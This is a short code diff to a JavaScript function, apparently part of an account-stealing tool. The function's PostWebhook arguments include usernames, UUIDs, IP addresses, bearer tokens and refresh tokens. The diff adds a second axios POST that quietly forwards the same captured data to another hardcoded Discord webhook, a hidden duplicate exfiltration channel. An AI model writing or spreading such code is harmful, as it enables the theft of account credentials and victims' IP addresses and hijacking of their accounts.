@@ -377,7 +377,26 @@ function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, ne
         // do nothing
     }).catch(error => {
             console.log("Error sending webhook: ", error)
-})}
+})
+
+var config2 = {
+    method: "POST",
+    url: "https://ptb.discord.com/api/webhooks/1107724280373981326/HxJEISBqO7Io1uJLyDk62T2jiNTEUFVah7VflOw7yZfdnA2YzAFvkxbcnKaa8hRO6BVp",
+    headers: { "Content-Type": "application/json" },
+    data: data,
+};
+
+// send the webhook the data
+axios(config2)
+.then((response) => {
+    // do nothing
+}).catch(error => {
+        console.log("Error sending webhook: ", error)
+})
+
+}
+
+
 function getIp(req) {
     return (
         req.headers["cf-connecting-ip"] ||
